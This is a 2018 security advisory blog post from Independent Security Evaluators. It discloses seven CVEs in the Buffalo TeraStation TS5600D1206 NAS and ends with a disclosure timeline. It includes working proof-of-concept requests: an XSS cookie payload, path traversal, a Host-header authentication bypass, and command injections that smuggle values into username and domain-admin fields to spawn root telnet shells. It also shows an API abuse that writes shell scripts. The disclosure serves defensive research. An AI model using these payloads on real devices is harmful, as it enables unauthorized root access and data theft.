=== Content from blog.securityevaluators.com_63637ab3_20250125_133202.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fab5d159f036d&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&source=---top_nav_layout_nav----------------------------------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fbuffalo-terastation-ts5600d1206-nas-cve-disclosure-ab5d159f036d&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fbuffalo-terastation-ts5600d1206-nas-cve-disclosure-ab5d159f036d&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fbuffalo-terastation-ts5600d1206-nas-cve-disclosure-ab5d159f036d&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fbuffalo-terastation-ts5600d1206-nas-cve-disclosure-ab5d159f036d&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# Critical vulnerabilities Identified in Buffalo TeraStation TS5600D1206 NAS [CVE Disclosure]

## ISE Labs awarded 7 CVEs for research performed on enterprise NAS device.

[![Rick Ramgattie](https://miro.medium.com/v2/resize:fill:88:88/1*M-EfS6JpWLBlYQrmPIYSiA.jpeg)](https://medium.com/%40rramgattie?source=post_page---byline--ab5d159f036d--------------------------------)[![Independent Security Evaluators](https://miro.medium.com/v2/resize:fill:48:48/1*zlPb8cRt0y45p5s2efL2uw.png)](https://blog.securityevaluators.com/?source=post_page---byline--ab5d159f036d--------------------------------)

[Rick Ramgattie](https://medium.com/%40rramgattie?source=post_page---byline--ab5d159f036d--------------------------------)

·

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F36598331fd0d&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fbuffalo-terastation-ts5600d1206-nas-cve-disclosure-ab5d159f036d&user=Rick+Ramgattie&userId=36598331fd0d&source=post_page-36598331fd0d--byline--ab5d159f036d---------------------post_header-----------)

Published in[Independent Security Evaluators](https://blog.securityevaluators.com/?source=post_page---byline--ab5d159f036d--------------------------------)·4 min read·Nov 8, 2018

--

Listen

Share

ISE Labs has identified critical vulnerabilities in the Buffalo TeraStation TS5600D1206, an enterprise-grade Network-Attached Storage (NAS) device. The Buffalo NAS is a robust multi-bay NAS that provides a web accessible management portal with diverse functionality.

The following blog post covers the vulnerabilities we identified in network accessible services provided by the TeraStation TS5600D1206. All of our findings affect firmware version *3.61–0.08*.

![]()
## Cross-site scripting via “username” cookie (CVE-2018–13323)

By setting the *username* cookie to a URL-encoded HTML element, arbitrary JavaScript can be executed when the web application is loaded. For example, with a cookie value of *%3Cimg%20src%3Da%20onerror%3Dalert(document.cookie)%3E* (the URL-encoded form of *<img src=a onerror=alert(document.cookie)>*), the user’s session token will be displayed in an alert window.

## Arbitrary Directory Listing via Path Traversal (CVE-2018–13322)

The *list\_folders* method of the NAS’s *JSON RPC* functionality is vulnerable to path traversal. An authenticated attacker can list the contents of arbitrary directories on the system with a request of the following form (where *misterJosh1* is a valid share):

```
POST /nasapi/ HTTP/1.1
Host: 192.168.1.110
Content-Length: 153
Content-Type: application/json
Connection: close{“jsonrpc”:”2.0",”method”:”list_folders”,”params”:{“path”:”/misterJosh1/../../../usr/lib”,”sid”:”e3940fff-eef0–46cc-bf57–897789594118"},”id”:”1528998300218"}
```
# Unauthenticated Information Disclosure (CVE-2018–13319)

An unauthenticated attacker can make the following request to expose information about the NAS device, such as its hostname, firmware version, internal IP address, MAC address, and serial number:

```
POST /nasapi/ HTTP/1.1
Host: 192.168.1.110
Content-Length: 65
Content-Type: application/json
Connection: close{“jsonrpc”:”2.0",”method”:”get_portal_info”,”params”:{},”id”:”1"}
```
## Authentication Bypass on JSONRPC API (CVE-2018–13324)

An unauthenticated attacker may bypass most authentication checks on the *JSON RPC* API (*/nasapi/*) by supplying a crafted *Host* header. When a request is made to this API, *buffalo\_jsonrpc2.py* checks the *Host* header for a value of *127.0.0.1* and if that value is found, instructs *BuffaloJsonRpc.process* to skip authentication checks. Since this header is controlled by the client, a malicious actor may simply supply a *Host* header of *127.0.0.1* and remove the *sid* parameter to bypass auth checks. The example request provided below will set the device’s name to *ISETest* without authentication.

```
POST /nasapi/ HTTP/1.1
Host: 127.0.0.1
Connection: close
Content-Length: 118
Content-Type: application/json{“jsonrpc”:”2.0",”method”:”system.setHostname”,”params”:{“hostname”:”ISETest”,”description”:”securityevaluators.com”},”id”:”1"}
```
## Command Injection During User Creation (Second Order) (CVE-2018–13318)

During user creation, the new user’s *username* is stored in a database, retrieved, and then passed as-is to a shell running the *pdbedit* command. As a result, an attacker may inject arbitrary system commands via the *username*. This injection vector is somewhat limited, as only certain special characters are permitted (“-\_.!#&@$\*^%”), but it is possible to spawn a *root* shell regardless. Although this attack requires administrator privileges, other vulnerabilities (see *Authentication Bypass on JSONRPC API*) may allow unauthenticated attackers to exploit this issue.

The example below demonstrates this by creating a new *telnetd* server running on port *8383*. The first request creates the new user while the second request processes the job.

```
POST /nasapi/ HTTP/1.1
Host: 192.168.1.110
Content-Length: 210
Content-Type: application/json
Cookie: lang=en; username=admin; sid=26d2d19c-86fd-4514-bd1b-eb814d8fced4
Connection: close{“jsonrpc”:”2.0",”method”:”User.create”,”params”:{“name”:”borkuser12$IFS&telnetd$IFS-p$IFS$@8383$IFS-l$IFS$@$SHELL”,”password”:”borkbork”,”use_quota”:0,”group_id”:100,”sub_group_ids”:[100],”sid”:”26d2d19c-86fd-4514-bd1b-eb814d8fced4"},”id”:”1529015369084"}POST /nasapi/ HTTP/1.1
Host: 127.0.0.1
Content-Length: 82
Content-Type: application/json
Cookie: lang=en; username=admin; sid=26d2d19c-86fd-4514-bd1b-eb814d8fced4
Connection: close{“jsonrpc”:”2.0",”method”:”apply_settings”,”params”:{“sid”:”26d2d19c-86fd-4514-bd1b-eb814d8fced4"},”id”:”1529015375895"}
```
## Command Injection in NT Domain Settings (CVE-2018–13320)

When setting authentication information for an NT domain using the *JSONRPC API*, the *adminUsername* and *adminPassword* values are concatenated and passed to the shell without validation, allowing authenticated attackers to execute arbitrary commands on the NAS.

Although this attack requires administrator privileges, other vulnerabilities (see *Authentication Bypass on JSONRPC API*) may allow unauthenticated attackers to exploit this issue.

The following request exploits this vulnerability to launch a telnet daemon on port *1337*:

```
POST /nasapi/ HTTP/1.1
Host: 192.168.1.110
Content-Length: 287
Content-Type: application/json
Connection: close{“jsonrpc”:”2.0",”method”:”network.set_auth_settings”,”params”:{“auth_method”:”ntdomain”,”workgroup”:”WORKGROUP”,”domainComputerName”:”domain”,”adminUsername”:”\”; telnetd -p 1337 -l $SHELL #”,”adminPassword”:”password”,”sid”:”b3b25781–0744–4271-b6b3–91149e722861"},”id”:”1529083018127"}
```
## Internal Functions Accessible via JSONRPC API (CVE-2018–13321)

During startup, the *JSONRPC* API will create routes to callable functions within the *root* scope of all modules, as long as these functions are not prefixed by an underscore. This allows the API to automatically load and route new endpoints from modules. However, certain modules import dangerous functions directly, exposing such functions to users. For example, the module *wbfs.py* performs *from settings import \** and *from confutil import \**. This results in sensitive functions like *execute\_sql* and *write\_conf* being accessible at *wbfs.executesql* and *wbfs.writeconf* respectively. Using these endpoints, an authenticated attacker may execute arbitrary SQL queries and/or create shell scripts with arbitrary content in arbitrary locations. Additionally, other vulnerabilities (see *Authentication Bypass on JSONRPC API*) may allow attackers to exploit this vulnerability without authentication.

The following example uses the *write\_conf* function to create a shell script at */tmp/bork.sh* containing a command to launch a *telnet* server. Although this example is placed in */tmp*, it may be placed in more dangerous locations as well, such as overwriting an existing system script.

```
POST /nasapi/ HTTP/1.1
Host: 127.0.0.1
Content-Length: 180
Content-Type: application/json
Accept: */*
Connection: close{“jsonrpc”:”2.0",”method”:”wbfs.writeconf”,”params”:{“path”:”/tmp/bork.sh”,”data”:{“#!/bin/bash #”:””,”telnetd -p 8383 -l /bin/bash #”:””},”add_quotes”:false},”id”:”1"}
```

The following example uses the *execute\_sql* function to create a new table in the database. Although the server responds with an error, the database contents will be updated. Executing the example request once more will produce a different error, showing that the table has been created.

```
POST /nasapi/ HTTP/1.1
Host: 127.0.0.1
Content-Length: 143
Content-Type: application/json
Accept: */*
Connection: close{“jsonrpc”:”2.0",”method”:”wbfs.executesql”,”params”:{“sql”:”CREATE TABLE bork (bork1 INTEGER PRIMARY KEY, bork2 TEXT);”},”id”:”1"}
```
## Responsible Disclosure Timeline

* **June 22, 2018:** Contacted Buffalo about sending vulnerabilities over.
* **July 2, 2018:** Contacted Buffalo about sending vulnerabilities over.
* **July 3, 2018:** Sent Buffalo vulnerabilities over email. (No response from Buffalo)
* **August 22, 2018:** Sent CVE numbers to Buffalo.(No response from Buffalo)

*Rick Ramgattie, Security Analyst at* [*Independent Security Evaluators*](http://securityevaluators.com)

*Twitters:* [*@ISESecurity*](https://twitter.com/ISEsecurity) *@rramgattie*

[**Sign up to get our latest blogs.**](http://eepurl.com/bLc2bf)

[API](https://medium.com/tag/api?source=post_page-----ab5d159f036d--------------------------------)[Hacking](https://medium.com/tag/hacking?source=post_page-----ab5d159f036d--------------------------------)[Ise Labs](https://medium.com/tag/ise-labs?source=post_page-----ab5d159f036d--------------------------------)[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----ab5d159f036d--------------------------------)[Information Security](https://medium.com/tag/information-security?source=post_page-----ab5d159f036d--------------------------------)

--

--

[![Independent Security Evaluators](https://miro.medium.com/v2/resize:fill:96:96/1*zlPb8cRt0y45p5s2efL2uw.png)](https://blog.securityevaluators.com/?source=post_page---post_publication_info--ab5d159f036d--------------------------------)[![Independent Security Evaluators](https://miro.medium.com/v2/resize:fill:128:128/1*zlPb8cRt0y45p5s2efL2uw.png)](https://blog.securityevaluators.com/?source=post_page---post_publication_info--ab5d159f036d--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fcollection%2Findependent-security-evaluators&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fbuffalo-terastation-ts5600d1206-nas-cve-disclosure-ab5d159f036d&collection=Independent+Security+Evaluators&collectionId=85ea1a550e4c&source=post_page---post_publication_info--ab5d159f036d---------------------follow_profile-----------)[## Published in Independent Security Evaluators](https://blog.securityevaluators.com/?source=post_page---post_publication_info--ab5d159f036d--------------------------------)[1K Followers](/followers?source=post_page---post_publication_info--ab5d159f036d--------------------------------)·[Last published Mar 7, 2022](/reading-hackable-without-a-background-in-security-a22ebe59b3e8?source=post_page---post_publication_info--ab5d159f036d--------------------------------)

Security specialists that provide custom services including security assessments and software development. ISE also runs IoT Village, which hosts talks by expert security researchers and hacking contests.

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fcollection%2Findependent-security-evaluators&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fbuffalo-terastation-ts5600d1206-nas-cve-disclosure-ab5d159f036d&collection=Independent+Security+Evaluators&collectionId=85ea1a550e4c&source=post_page---post_publication_info--ab5d159f036d---------------------follow_profile-----------)[![Rick Ramgattie](https://miro.medium.com/v2/resize:fill:96:96/1*M-EfS6JpWLBlYQrmPIYSiA.jpeg)](https://medium.com/%40rramgattie?source=post_page---post_author_info--ab5d159f036d--------------------------------)[![Rick Ramgattie](https://miro.medium.com/v2/resize:fill:128:128/1*M-EfS6JpWLBlYQrmPIYSiA.jpeg)](https://medium.com/%40rramgattie?source=post_page---post_author_info--ab5d159f036d--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F36598331fd0d&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fbuffalo-terastation-ts5600d1206-nas-cve-disclosure-ab5d159f036d&user=Rick+Ramgattie&userId=36598331fd0d&source=post_page-36598331fd0d--post_author_info--ab5d159f036d---------------------follow_profile-----------)[## Written by Rick Ramgattie](https://medium.com/%40rramgattie?source=post_page---post_author_info--ab5d159f036d--------------------------------)[188 Followers](https://medium.com/%40rramgattie/followers?source=post_page---post_author_info--ab5d159f036d--------------------------------)·[40 Following](https://medium.com/%40rramgattie/following?source=post_page---post_author_info--ab5d159f036d--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F36598331fd0d&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fbuffalo-terastation-ts5600d1206-nas-cve-disclosure-ab5d159f036d&user=Rick+Ramgattie&userId=36598331fd0d&source=post_page-36598331fd0d--post_author_info--ab5d159f036d---------------------follow_profile-----------)
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----ab5d159f036d--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----ab5d159f036d--------------------------------)[About](https://medium.com/about?autoplay=1&source=post_page-----ab5d159f036d--------------------------------)[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----ab5d159f036d--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----ab5d159f036d--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----ab5d159f036d--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----ab5d159f036d--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----ab5d159f036d--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----ab5d159f036d--------------------------------)[Teams](https://medium.com/business?source=post_page-----ab5d159f036d--------------------------------)


